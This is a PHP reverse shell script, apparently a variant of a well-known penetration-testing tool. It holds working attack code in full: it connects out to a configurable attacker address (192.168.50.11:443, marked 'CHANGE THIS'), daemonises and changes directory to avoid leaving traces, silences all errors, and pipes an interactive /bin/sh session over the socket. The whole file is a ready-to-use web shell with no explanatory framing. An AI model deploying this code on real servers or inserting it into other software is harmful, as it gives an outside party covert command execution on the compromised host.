<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.50.11';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid leaving a trace
//
if (function_exists('pcntl_fork')) {
    // Fork and have the parent exit
    $pid = pcntl_fork();

    if ($pid == -1) {
        printd("ERROR: Can't fork\n");
        exit(1);
    }

    if ($pid) {
        exit(0);  // Parent exits
    }

    if (posix_setsid() == -1) {
        printd("ERROR: Can't setsid()\n");
        exit(1);
    }

    $daemon = 1;
} else {
    printd("WARNING: Daemonisation not supported on this system\n");
}

// Chdir to / to avoid leaving traces
chdir("/");

// Do not display errors
ini_set('display_errors', 0);
set_error_handler('errorHandler');

function errorHandler($errno, $errstr, $errfile, $errline) {
    // Do nothing, suppress all errors
}

// Make the connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printd("$errstr ($errno)\n");
    exit(1);
}

// Spawn shell
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printd("ERROR: Can't spawn shell\n");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printd("Successfully opened reverse shell to $ip:$port\n");

while (!feof($sock) && !feof($pipes[1])) {
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if (($input = fread($sock, $chunk_size)) === false) {
            printd("ERROR: Could not read from socket\n");
            break;
        }
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if (($input = fread($pipes[1], $chunk_size)) === false) {
            printd("ERROR: Could not read from stdout\n");
            break;
        }
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if (($input = fread($pipes[2], $chunk_size)) === false) {
            printd("ERROR: Could not read from stderr\n");
            break;
        }
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printd($string) {
    global $debug;
    if ($debug) {
        echo $string;
    }
}
?>